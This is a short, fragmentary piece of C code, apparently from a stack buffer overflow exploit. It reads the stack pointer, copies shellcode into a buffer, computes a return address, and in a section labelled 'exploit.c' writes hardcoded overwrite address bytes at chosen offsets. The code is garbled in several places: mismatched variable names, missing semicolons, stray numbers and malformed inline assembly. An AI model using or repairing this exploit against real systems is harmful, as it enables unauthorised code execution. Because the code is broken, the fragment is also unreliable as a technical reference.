unsigned long get_sp(void){
__asm__("movl %esp %eax");
}

int i=0;
char *ptr;
long *addrptr;
long returnaddr;
int num=sizeof(buffer)-(sizeof(shellcode)+1);
ptr = buffer;
addrptr = (long*)(ptr);
retaddr = get_sp() + 500;
for(i=0;i<20;i++)
buffer[num+i]=shellcode[i];

buffer[sizeof(buffer)-1]='\0';



exploit.c

int D = 32; 36 40 44
buffer[D+0]=0x68;
buffer[D+1]=0xEB
buffer[D+2]=0xFF
buffer[D+3]=0xBF